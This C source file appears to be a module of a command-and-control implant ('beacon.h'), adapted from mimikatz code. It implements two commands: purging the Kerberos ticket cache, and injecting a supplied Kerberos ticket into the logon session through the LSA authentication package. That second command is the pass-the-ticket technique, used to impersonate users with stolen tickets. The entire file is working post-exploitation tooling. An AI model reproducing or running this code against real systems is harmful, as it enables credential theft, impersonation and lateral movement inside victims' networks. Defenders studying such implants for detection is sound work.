/*	Adopted From: 
 *	Benjamin DELPY `gentilkiwi`
 *	http://blog.gentilkiwi.com
 *	benjamin@gentilkiwi.com
 *	Licence : http://creativecommons.org/licenses/by/3.0/fr/
 */

#include <ntstatus.h>
#define WIN32_NO_STATUS
#define SECURITY_WIN32
#include <windows.h>
#include <ntsecapi.h>
#include "beacon.h"
#include "commands.h"

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#endif

#pragma comment( lib, "secur32" )

STRING  kerberosPackageName = {8, 9, MICROSOFT_KERBEROS_NAME_A};
DWORD   g_AuthenticationPackageId_Kerberos = 0;
BOOL    g_isAuthPackageKerberos = FALSE;
HANDLE  g_hLSA = NULL;

/* initialize some kerberos stuff */
NTSTATUS kerberos_init() {
	NTSTATUS status;

	if (g_hLSA != NULL)
		return STATUS_SUCCESS;

	status = LsaConnectUntrusted(&g_hLSA);

	if (NT_SUCCESS(status)) {
		status = LsaLookupAuthenticationPackage(g_hLSA, &kerberosPackageName, &g_AuthenticationPackageId_Kerberos);
		g_isAuthPackageKerberos = NT_SUCCESS(status);
	}
	return status;
}

NTSTATUS LsaCallKerberosPackage(PVOID ProtocolSubmitBuffer, ULONG SubmitBufferLength, PVOID *ProtocolReturnBuffer, PULONG ReturnBufferLength, PNTSTATUS ProtocolStatus) {
	NTSTATUS status = STATUS_HANDLE_NO_LONGER_VALID;
	if(g_hLSA && g_isAuthPackageKerberos)
		status = LsaCallAuthenticationPackage(g_hLSA, g_AuthenticationPackageId_Kerberos, ProtocolSubmitBuffer, SubmitBufferLength, ProtocolReturnBuffer, ReturnBufferLength, ProtocolStatus);
	return status;
}

void command_kerberos_ticket_purge() {
	NTSTATUS status, packageStatus;
	KERB_PURGE_TKT_CACHE_REQUEST kerbPurgeRequest = {KerbPurgeTicketCacheMessage, {0, 0}, {0, 0, NULL}, {0, 0, NULL}};
	PVOID dumPtr;
	DWORD responseSize;

	kerberos_init();

	status = LsaCallKerberosPackage(&kerbPurgeRequest, sizeof(KERB_PURGE_TKT_CACHE_REQUEST), &dumPtr, &responseSize, &packageStatus);
	if (NT_SUCCESS(status)) {
		if (NT_SUCCESS(packageStatus)) {
			// do nothing, I guess.
		}
		else {
			post_error_d(0x1c, status);
		}
	}
	else {
		post_error_d(0x1c, status);
	}
}

void command_kerberos_ticket_use(char * fileData, int fileSize) {
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	NTSTATUS packageStatus;
	DWORD submitSize, responseSize;
	PKERB_SUBMIT_TKT_REQUEST pKerbSubmit;
	PVOID dumPtr;

	kerberos_init();

	submitSize = sizeof(KERB_SUBMIT_TKT_REQUEST) + fileSize;
	if (pKerbSubmit = (PKERB_SUBMIT_TKT_REQUEST) LocalAlloc(LPTR, submitSize)) {
		pKerbSubmit->MessageType = KerbSubmitTicketMessage;
		pKerbSubmit->KerbCredSize = fileSize;
		pKerbSubmit->KerbCredOffset = sizeof(KERB_SUBMIT_TKT_REQUEST);
		RtlCopyMemory((PBYTE) pKerbSubmit + pKerbSubmit->KerbCredOffset, fileData, pKerbSubmit->KerbCredSize);

		status = LsaCallKerberosPackage(pKerbSubmit, submitSize, &dumPtr, &responseSize, &packageStatus);
		if (NT_SUCCESS(status)) {
			if (NT_SUCCESS(packageStatus)) {
				status = STATUS_SUCCESS;
			}
			else {
				post_error_d(0x1d, status);
			}
		}
		else {
			post_error_d(0x1d, status);
		}

		LocalFree(pKerbSubmit);
	}
}